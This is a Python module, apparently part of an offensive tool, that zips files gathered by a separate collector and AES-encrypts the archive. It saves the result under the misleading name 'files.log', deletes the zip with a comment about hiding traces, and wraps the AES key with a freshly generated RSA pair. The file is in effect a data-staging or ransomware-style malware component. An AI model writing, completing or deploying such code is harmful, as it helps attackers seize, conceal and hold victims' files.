import os
from file_collecter import collect_files
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
import shutil
import zipfile

def run_encryption(found_files):
    #found_files is passed into this function from collect_files(), so no need to call it again
    staging_folder = "staged_files"


    #Zip the entire staging folder to encrypt later
    zip_filename = "staged.zip"
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file_path in found_files:
            arcname = os.path.basename(file_path)
            zipf.write(file_path, arcname)
    print(f"Zipped folder into: {zip_filename}")

    #Generate AES key and IV
    key = get_random_bytes(32)  # 256-bit AES key
    iv = get_random_bytes(16)   # 128-bit IV

    #Save AES key and IV
    with open("key.key", "wb") as f:
        f.write(key)

    with open("iv.key", "wb") as f:
        f.write(iv)

    #Encrypt each file using AES-CBC
    try:
        with open(zip_filename, "rb") as f:
            data = f.read()

        #Pad data to make it a multiple of 16 bytes
        padding_len = 16 - len(data) % 16
        data += bytes([padding_len] * padding_len)

        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_data = cipher.encrypt(data)

        with open("files.log", "wb") as f:
            f.write(encrypted_data)

        #Cleanup the original zip to hide traces
        os.remove(zip_filename)

        print("Encrypted zip and saved as: files.log")

    except Exception as e:
        print(f"Failed to encrypt ZIP file: {e}")

    #Generate RSA key pair
    rsa_key = RSA.generate(2048)
    private_key = rsa_key.export_key()
    public_key = rsa_key.publickey().export_key()

    #Save RSA keys
    with open("private_key.pem", "wb") as f:
        f.write(private_key)

    with open("public_key.pem", "wb") as f:
        f.write(public_key)

    #Encrypt AES key using RSA public key
    rsa_public = RSA.import_key(public_key)
    cipher_rsa = PKCS1_OAEP.new(rsa_public)
    encrypted_aes_key = cipher_rsa.encrypt(key)

    #Save encrypted AES key
    with open("key_encrypted.bin", "wb") as f:
        f.write(encrypted_aes_key)

    #Final Outputs
    print("\nEncryption complete.")
    print("AES key saved to: key.key")
    print("IV saved to: iv.key")
    print("RSA-encrypted AES key saved to: key_encrypted.bin")
    print("RSA keys saved to: private_key.pem & public_key.pem")